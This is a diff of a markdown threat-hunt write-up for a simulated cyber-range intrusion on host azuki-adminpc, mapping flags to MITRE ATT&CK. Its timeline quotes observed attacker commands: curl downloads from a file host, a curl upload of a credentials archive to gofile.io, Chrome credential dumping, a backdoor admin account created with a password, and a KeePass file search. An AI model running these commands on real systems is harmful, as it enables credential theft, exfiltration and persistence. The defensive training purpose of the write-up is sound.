@@ -1,9 +1,8 @@
-# 🚩 Virtual Machine Compromise (Bridge Take Over)
+# 🌉 Threat Hunt SAGA#3: Bridge Takeover
 
 <!-- cover image: upload to the PR and paste the <img> line here -->
 
 **Sandbox Contributor:** [Cyber Range AZURE LAW by Josh Madakor's team](https://www.skool.com/cyber-community)  
-**Hunt Design Master:** <!-- Hunt Design Master name -->  
 **Loyal Wingbot:** [MixLocalAgentic_SOC_Analyst](https://github.com/Panbear1983/Multi-Funtion_SOC_Agent_Research/tree/main/openAI_Agentic_SOC_Analyst)
 
 <hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">
@@ -12,7 +11,7 @@
 Date Completed: ***2026-09-05***    
 Simulated Environment: `Cyber Range AZURE LAW`  
 Primary Impacted Host: `azuki-adminpc`  
-Incident Date Range: ***11/25/2025 to 2025-11-25***  
+Incident Date Range: ***2025-11-25 to 2025-11-25***  
 Hunt Link: [Cyber Range SOC - AZUKI-TRADING - BRIDGE TAKEOVER](https://docs.google.com/forms/d/e/1FAIpQLSf5PNshNzWJbp54MlIRONDzf6wpFKlydHF-KN54_NLeX1n7Iw/viewform)  
 Frameworks Applied: ***MITRE ATT&CK***, ***NIST 800-61***
 
@@ -41,7 +40,7 @@ The tradecraft was competent but not novel. Everything relied on living-off-the-
 
 | Stage | Flag | Tactic | Technique ID | Technique |
 |---|---|---|---|---|
-| Lateral Movement | 1 | Lateral Movement | **TBD** | TBD |
+| Lateral Movement | 1 | Lateral Movement | **TA0008** | Lateral Movement (tactic) |
 | Lateral Movement | 2 | Lateral Movement | **T1078** | Valid Accounts |
 | Lateral Movement | 3 | Lateral Movement | **T1082** | System Information Discovery |
 | Execution | 4 | Execution | **T1608.001** | Stage Capabilities |
@@ -127,31 +126,31 @@ The intrusion followed a clean, linear chain: RDP lateral movement from 10.1.0.2
 
 | **Timestamp (UTC)** | **Event** | **Target Device** | **Details** |
 |---|---|---|---|
-| **11/25/2025, 6:09:18.203 AM** | RDP pivot from foreign subnet | azuki-adminpc | `10.1.0.204` (Flag 1) |
-| **11/25/2025, 6:09:18.203 AM** | Valid account yuki.tanaka reused | azuki-adminpc | `yuki.tanaka` (Flag 2) |
-| **11/25/2025, 6:09:18.203 AM** | Admin workstation azuki-adminpc targeted | azuki-adminpc | `azuki-adminpc` (Flag 3) |
-| **2025-11-25 04:41:52** | Payload staged on catbox host | rows | `litter.catbox.moe` (Flag 4) |
+| **2025-11-25 06:09:18** | RDP pivot from foreign subnet | azuki-adminpc | `10.1.0.204` (Flag 1) |
+| **2025-11-25 06:09:18** | Valid account yuki.tanaka reused | azuki-adminpc | `yuki.tanaka` (Flag 2) |
+| **2025-11-25 06:09:18** | Admin workstation azuki-adminpc targeted | azuki-adminpc | `azuki-adminpc` (Flag 3) |
+| **2025-11-25 04:41:52** | Payload staged on catbox host | azuki-adminpc | `litter.catbox.moe` (Flag 4) |
 | **11/25/2025 ~** | Fake KB archive downloaded | Windows | `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.mo` (Flag 5) |
 | **11/25/2025 ~** | Password-protected archive extracted | Windows | `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\c` (Flag 6) |
-| **11/25/2025 ~** | Meterpreter C2 implant deployed | rows | `meterpreter.exe` (Flag 7) |
+| **11/25/2025 ~** | Meterpreter C2 implant deployed | azuki-adminpc | `meterpreter.exe` (Flag 7) |
 | **11/25/2025 ~** | Named pipe C2 channel opened | Rows | `\\Device\\NamedPipe\\msf-pipe-5902` (Flag 8) |
 | **2025-11-25 04:51:08** | Base64 account creation decoded | EncodedCommand | `net user yuki.tanaka2 B@ckd00r2024! /add` (Flag 9) |
 | **11/25/2025 ~** | Lookalike backdoor account created | EncodedCommand | `yuki.tanaka2` (Flag 10) |
-| **11/25/2025, 4:51:10.092 AM** | Backdoor added to Administrators | EncodedCommand | `net localgroup Administrators yuki.tanaka2 /add` (Flag 11) |
-| **11/25/2025, 4:08:58.585 AM** | RDP session enumeration run | azuki-adminpc | `qwinsta.exe` (Flag 12) |
-| **11/25/2025, 4:09:25.442 AM** | Domain trusts enumerated | azuki-adminpc | `"nltest.exe" /domain_trusts /all_trusts` (Flag 13) |
-| **11/25/2025, 4:10:07.805 AM** | Network connections enumerated | azuki-adminpc | `"NETSTAT.EXE" -ano` (Flag 14) |
-| **11/25/2025, 4:13:45.817 AM** | Recursive KeePass database search | azuki-adminpc | `"cmd.exe" /c where /r C:\Users *.kdbx` (Flag 15) |
-| **11/25/2025, 4:15:57.398 AM** | Old password file discovered | azuki-adminpc | `OLD-Passwords.lnk` (Flag 16) |
+| **2025-11-25 04:51:10** | Backdoor added to Administrators | EncodedCommand | `net localgroup Administrators yuki.tanaka2 /add` (Flag 11) |
+| **2025-11-25 04:08:58** | RDP session enumeration run | azuki-adminpc | `qwinsta.exe` (Flag 12) |
+| **2025-11-25 04:09:25** | Domain trusts enumerated | azuki-adminpc | `"nltest.exe" /domain_trusts /all_trusts` (Flag 13) |
+| **2025-11-25 04:10:07** | Network connections enumerated | azuki-adminpc | `"NETSTAT.EXE" -ano` (Flag 14) |
+| **2025-11-25 04:13:45** | Recursive KeePass database search | azuki-adminpc | `"cmd.exe" /c where /r C:\Users *.kdbx` (Flag 15) |
+| **2025-11-25 04:15:57** | Old password file discovered | azuki-adminpc | `OLD-Passwords.lnk` (Flag 16) |
 | **2025-11-25 04:37:03** | Hidden staging directory created | azuki-adminpc | `C:\ProgramData\Microsoft\Crypto\staging` (Flag 17) |
-| **11/25/2025, 4:37:03.007 AM** | Banking documents copied to staging | azuki-adminpc | `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\C` (Flag 18) |
-| **11/25/2025, 4:37:33.982 AM** | Eight archives assembled for exfil | azuki-adminpc | `8` (Flag 19) |
-| **11/25/2025, 5:55:34.528 AM** | Credential theft tool downloaded | azuki-adminpc | `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` (Flag 20) |
-| **11/25/2025, 5:55:54.858 AM** | Chrome credential store dumped | Windows | `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Da` (Flag 21) |
-| **11/25/2025, 4:41:51.772 AM** | First archive uploaded externally | azuki-adminpc | `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFi` (Flag 22) |
+| **2025-11-25 04:37:03** | Banking documents copied to staging | azuki-adminpc | `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\C` (Flag 18) |
+| **2025-11-25 04:37:33** | Eight archives assembled for exfil | azuki-adminpc | `8` (Flag 19) |
+| **2025-11-25 05:55:34** | Credential theft tool downloaded | azuki-adminpc | `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` (Flag 20) |
+| **2025-11-25 05:55:54** | Chrome credential store dumped | Windows | `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Da` (Flag 21) |
+| **2025-11-25 04:41:51** | First archive uploaded externally | azuki-adminpc | `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFi` (Flag 22) |
 | **11/25/2025 ~** | Exfiltration to gofile.io confirmed | azuki-adminpc | `gofile.io` (Flag 23) |
 | **11/25/2025 ~** | Exfiltration server IP identified | azuki-adminpc | `45.112.123.227` (Flag 24) |
-| **11/25/2025, 4:39:16.490 AM** | KeePass master password stolen | Azuki-Passwords | `KeePass-Master-Password.txt` (Flag 25) |
+| **2025-11-25 04:39:16** | KeePass master password stolen | Azuki-Passwords | `KeePass-Master-Password.txt` (Flag 25) |
 
 <hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">
 
@@ -197,7 +196,7 @@ The intrusion followed a clean, linear chain: RDP lateral movement from 10.1.0.2
 
 **Hint 2:** The source IP belongs to the system compromised in CTF 1 - cross-reference with your network logins.
 
-**Reference:** TBD
+**Reference:** Lateral Movement (TA0008)
 
 **KQL Query:**
 
